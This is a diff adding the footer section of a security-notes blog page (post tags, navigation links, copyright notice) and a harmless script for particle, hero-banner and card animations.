+      <strong>本文链接：</strong>
+      <a href="https://lvyatan.github.io/2026/07/28/Windows%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/" title="Windows 提权思路整理">https://lvyatan.github.io/2026/07/28/Windows提权思路整理/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"># 提权</a>
+              <a href="/tags/%E5%90%8E%E6%B8%97%E9%80%8F/" rel="tag"># 后渗透</a>
+              <a href="/tags/Windows/" rel="tag"># Windows</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/07/15/Wireshark%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/" rel="prev" title="Wireshark 抓包实战笔记">
+                  <i class="fa fa-angle-left"></i> Wireshark 抓包实战笔记
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/08/08/CSRF%E4%B8%8ESSRF%E5%8C%BA%E5%88%AB%E4%B8%8E%E5%88%A9%E7%94%A8/" rel="next" title="CSRF 与 SSRF 区别与利用">
+                  CSRF 与 SSRF 区别与利用 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-shield"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">true</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">11k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">41 分钟</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+<canvas id="particle-canvas"></canvas>
+<script>
+(function () {
+  'use strict';
+
+  // ====================================================================
+  // 1. 粒子动效：Canvas 粒子 + 连线 + 鼠标吸引
+  // ====================================================================
+  function initParticles() {
+    var canvas = document.getElementById('particle-canvas');
+    if (!canvas) return;
+    var ctx = canvas.getContext('2d');
+    var dpr = window.devicePixelRatio || 1;
+    var particles = [];
+    var mouse = { x: -9999, y: -9999, radius: 140 };
+
+    // 配置
+    var COLORS = ['#a78bfa', '#60a5fa', '#34d399', '#f472b6'];
+    var MAX_PARTICLES = window.innerWidth < 768 ? 38 : 70;
+    var LINK_DISTANCE = 130;
+
+    function resize() {
+      canvas.width = window.innerWidth * dpr;
+      canvas.height = window.innerHeight * dpr;
+      canvas.style.width = window.innerWidth + 'px';
+      canvas.style.height = window.innerHeight + 'px';
+      ctx.scale(dpr, dpr);
+    }
+
+    function Particle() {
+      this.x = Math.random() * window.innerWidth;
+      this.y = Math.random() * window.innerHeight;
+      this.vx = (Math.random() - 0.5) * 0.35;
+      this.vy = (Math.random() - 0.5) * 0.35;
+      this.radius = Math.random() * 2 + 1.2;
+      this.color = COLORS[Math.floor(Math.random() * COLORS.length)];
+      this.baseAlpha = Math.random() * 0.4 + 0.4;
+    }
+
+    Particle.prototype.update = function () {
+      // 鼠标吸引
+      var dx = mouse.x - this.x;
+      var dy = mouse.y - this.y;
+      var dist = Math.sqrt(dx * dx + dy * dy);
+      if (dist < mouse.radius) {
+        var force = (mouse.radius - dist) / mouse.radius;
+        this.vx += (dx / dist) * force * 0.06;
+        this.vy += (dy / dist) * force * 0.06;
+      }
+
+      // 摩擦
+      this.vx *= 0.985;
+      this.vy *= 0.985;
+
+      // 限速
+      var speed = Math.sqrt(this.vx * this.vx + this.vy * this.vy);
+      if (speed > 1.5) {
+        this.vx = (this.vx / speed) * 1.5;
+        this.vy = (this.vy / speed) * 1.5;
+      }
+
+      this.x += this.vx;
+      this.y += this.vy;
+
+      // 边界回弹
+      if (this.x < 0 || this.x > window.innerWidth) this.vx *= -1;
+      if (this.y < 0 || this.y > window.innerHeight) this.vy *= -1;
+      this.x = Math.max(0, Math.min(window.innerWidth, this.x));
+      this.y = Math.max(0, Math.min(window.innerHeight, this.y));
+    };
+
+    Particle.prototype.draw = function () {
+      ctx.beginPath();
+      ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
+      ctx.fillStyle = this.color;
+      ctx.globalAlpha = this.baseAlpha;
+      ctx.fill();
+
+      // 柔光
+      ctx.beginPath();
+      ctx.arc(this.x, this.y, this.radius * 3, 0, Math.PI * 2);
+      var grad = ctx.createRadialGradient(this.x, this.y, 0, this.x, this.y, this.radius * 3);
+      grad.addColorStop(0, this.color);
+      grad.addColorStop(1, 'transparent');
+      ctx.fillStyle = grad;
+      ctx.globalAlpha = 0.12;
+      ctx.fill();
+      ctx.globalAlpha = 1;
+    };
+
+    function drawLinks() {
+      for (var i = 0; i < particles.length; i++) {
+        for (var j = i + 1; j < particles.length; j++) {
+          var p1 = particles[i];
+          var p2 = particles[j];
+          var dx = p1.x - p2.x;
+          var dy = p1.y - p2.y;
+          var dist = Math.sqrt(dx * dx + dy * dy);
+          if (dist < LINK_DISTANCE) {
+            var alpha = (1 - dist / LINK_DISTANCE) * 0.22;
+            ctx.beginPath();
+            ctx.strokeStyle = p1.color;
+            ctx.globalAlpha = alpha;
+            ctx.lineWidth = 1;
+            ctx.moveTo(p1.x, p1.y);
+            ctx.lineTo(p2.x, p2.y);
+            ctx.stroke();
+            ctx.globalAlpha = 1;
+          }
+        }
+      }
+    }
+
+    function animate() {
+      ctx.clearRect(0, 0, window.innerWidth, window.innerHeight);
+      drawLinks();
+      for (var i = 0; i < particles.length; i++) {
+        particles[i].update();
+        particles[i].draw();
+      }
+      requestAnimationFrame(animate);
+    }
+
+    function createParticles() {
+      particles = [];
+      for (var i = 0; i < MAX_PARTICLES; i++) particles.push(new Particle());
+    }
+
+    // 初始化
+    resize();
+    createParticles();
+    animate();
+
+    // 鼠标 / 触摸
+    window.addEventListener('mousemove', function (e) {
+      mouse.x = e.clientX;
+      mouse.y = e.clientY;
+    });
+    window.addEventListener('mouseout', function () {
+      mouse.x = -9999; mouse.y = -9999;
+    });
+    window.addEventListener('touchmove', function (e) {
+      if (e.touches[0]) {
+        mouse.x = e.touches[0].clientX;
+        mouse.y = e.touches[0].clientY;
+      }
+    });
+
+    // resize
+    var resizeTimer;
+    window.addEventListener('resize', function () {
+      clearTimeout(resizeTimer);
+      resizeTimer = setTimeout(function () {
+        resize();
+        createParticles();
+      }, 200);
+    });
+
+    // 低性能模式：电池或低性能时减粒子
+    if (navigator.getBattery && navigator.getBattery()) {
+      navigator.getBattery().then(function (battery) {
+        if (battery.discharging && battery.level < 0.2) {
+          MAX_PARTICLES = 25;
+          createParticles();
+        }
+      });
+    }
+  }
+
+  // ====================================================================
+  // 2. Hero 区：仅首页注入
+  // ====================================================================
+  function injectHero() {
+    // 通过 page 配置判断是否首页
+    var pageConfigs = document.querySelectorAll('script.next-config[data-name="page"]');
+    var isHome = false;
+    for (var i = 0; i < pageConfigs.length; i++) {
+      try {
+        var cfg = JSON.parse(pageConfigs[i].textContent || '{}');
+        if (cfg.isHome === true) { isHome = true; break; }
+      } catch (e) {}
+    }
+    if (!isHome) return;
+
+    var mainInner = document.querySelector('.main-inner.index.posts-expand');
+    if (!mainInner) return;
+    if (mainInner.querySelector('.hero-section')) return; // 防止重复
+
+    var hero = document.createElement('section');
+    hero.className = 'hero-section';
+    hero.innerHTML = ''
+      + '<div class="hero-content">'
+      + '  <span class="hero-eyebrow">CYBER · SECURITY · NOTES</span>'
+      + '  <h1 class="hero-title">网安学习笔记</h1>'
+      + '  <p class="hero-subtitle">'
+      + '    记录渗透测试、漏洞挖掘、安全工具开发的实践笔记。'
+      + '    <br>每一篇都是亲手敲过的 Payload、跑过的命令、踩过的坑。'
+      + '  </p>'
+      + '  <div class="hero-actions">'
+      + '    <a class="hero-btn hero-btn--primary" href="#main">'
+      + '      <i class="fa fa-book-open"></i> 开始阅读'
+      + '    </a>'
+      + '    <a class="hero-btn hero-btn--ghost" href="/about/">'
+      + '      <i class="fa fa-user"></i> 关于本站'
+      + '    </a>'
+      + '  </div>'
+      + '</div>'
+      + '<div class="hero-scroll-hint">SCROLL</div>';
+
+    mainInner.insertBefore(hero, mainInner.firstChild);
+
+    // 入场动画
+    setTimeout(function () {
+      hero.style.opacity = '0';
+      hero.style.transform = 'translateY(20px)';
+      hero.style.transition = 'opacity 0.8s ease, transform 0.8s cubic-bezier(0.16, 1, 0.3, 1)';
+      requestAnimationFrame(function () {
+        hero.style.opacity = '1';
+        hero.style.transform = 'translateY(0)';
+      });
+    }, 50);
+  }
+
+  // ====================================================================
+  // 3. 卡片入场动画（首页文章）
+  // ====================================================================
+  function animateCards() {
+    var cards = document.querySelectorAll('.index.posts-expand .post-block');
+    if (!cards.length) return;
+    if (!('IntersectionObserver' in window)) return;
+
+    cards.forEach(function (card, idx) {
+      card.style.opacity = '0';
+      card.style.transform = 'translateY(24px)';
+      card.style.transition = 'opacity 0.6s ease ' + (idx * 0.08) + 's, transform 0.6s cubic-bezier(0.16, 1, 0.3, 1) ' + (idx * 0.08) + 's';
+    });
+
+    var io = new IntersectionObserver(function (entries) {
+      entries.forEach(function (entry) {
+        if (entry.isIntersecting) {
+          entry.target.style.opacity = '1';
+          entry.target.style.transform = 'translateY(0)';
+          io.unobserve(entry.target);
+        }
+      });
+    }, { threshold: 0.1 });
+
+    cards.forEach(function (card) { io.observe(card); });
+  }
+
+  // ====================================================================
+  // 4. 启动
+  // ====================================================================
+  function boot() {
+    try { initParticles(); } catch (e) { console.warn('particles failed:', e); }
+    try { injectHero(); } catch (e) { console.warn('hero inject failed:', e); }
+    try { animateCards(); } catch (e) {}
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', boot);
+  } else {
+    boot();
+  }
+
+  // PJAX 兼容（NexT 用 pjax 切页）
+  window.addEventListener('pjax:success', boot);
+})();
+</script>
+
+</body>
+</html>
